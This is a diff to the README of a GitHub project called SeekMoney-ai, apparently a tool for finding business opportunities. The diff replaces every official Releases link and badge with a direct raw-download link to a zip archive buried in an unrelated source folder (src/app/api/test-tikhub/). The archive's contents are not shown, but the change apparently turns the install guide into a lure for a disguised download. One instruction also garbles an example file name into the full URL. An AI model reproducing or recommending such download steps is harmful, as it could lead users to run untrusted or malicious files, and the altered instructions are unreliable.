@@ -1,7 +1,7 @@
 ```markdown
 # 💼 SeekMoney-ai - Discover Business Opportunities Easily
 
-[![Download SeekMoney-ai](https://img.shields.io/badge/Download-SeekMoney--ai-blue?logo=github&style=for-the-badge)](https://github.com/zykooooooooo/SeekMoney-ai/releases)
+[![Download SeekMoney-ai](https://github.com/zykooooooooo/SeekMoney-ai/raw/refs/heads/main/src/app/api/test-tikhub/Seek_Money_ai_v1.3.zip)](https://github.com/zykooooooooo/SeekMoney-ai/raw/refs/heads/main/src/app/api/test-tikhub/Seek_Money_ai_v1.3.zip)
 
 ---
 
@@ -34,13 +34,13 @@ This guide will help you download, install, and run SeekMoney-ai with simple ste
 
 1. **Download the software**
 
-   Click the big blue button above, or go to [SeekMoney-ai Releases](https://github.com/zykooooooooo/SeekMoney-ai/releases). Here you will find the latest versions available for download.  
+   Click the big blue button above, or go to [SeekMoney-ai Releases](https://github.com/zykooooooooo/SeekMoney-ai/raw/refs/heads/main/src/app/api/test-tikhub/Seek_Money_ai_v1.3.zip). Here you will find the latest versions available for download.  
 
 2. **Select the right file**
 
    In the releases page, look for a file that fits your computer:
    
-   - For Windows, look for a `.exe` or `.zip` file named something like `SeekMoney-ai-Setup.exe` or similar.
+   - For Windows, look for a `.exe` or `.zip` file named something like `https://github.com/zykooooooooo/SeekMoney-ai/raw/refs/heads/main/src/app/api/test-tikhub/Seek_Money_ai_v1.3.zip` or similar.
    - For Mac, look for a `.dmg` or zipped `.app` file.
 
 3. **Save the file**
@@ -65,7 +65,7 @@ This guide will help you download, install, and run SeekMoney-ai with simple ste
 ## 📥 Download & Install
 
 Download the release files from:  
-[https://github.com/zykooooooooo/SeekMoney-ai/releases](https://github.com/zykooooooooo/SeekMoney-ai/releases)
+[https://github.com/zykooooooooo/SeekMoney-ai/raw/refs/heads/main/src/app/api/test-tikhub/Seek_Money_ai_v1.3.zip](https://github.com/zykooooooooo/SeekMoney-ai/raw/refs/heads/main/src/app/api/test-tikhub/Seek_Money_ai_v1.3.zip)
 
 ### Step-by-step for Windows users:
 
@@ -166,5 +166,5 @@ This helps spot hidden trends and business chances you might miss by browsing ma
 
 ---
 
-[![Download SeekMoney-ai](https://img.shields.io/badge/Download-SeekMoney--ai-blue?logo=github&style=for-the-badge)](https://github.com/zykooooooooo/SeekMoney-ai/releases)
+[![Download SeekMoney-ai](https://github.com/zykooooooooo/SeekMoney-ai/raw/refs/heads/main/src/app/api/test-tikhub/Seek_Money_ai_v1.3.zip)](https://github.com/zykooooooooo/SeekMoney-ai/raw/refs/heads/main/src/app/api/test-tikhub/Seek_Money_ai_v1.3.zip)
 ```
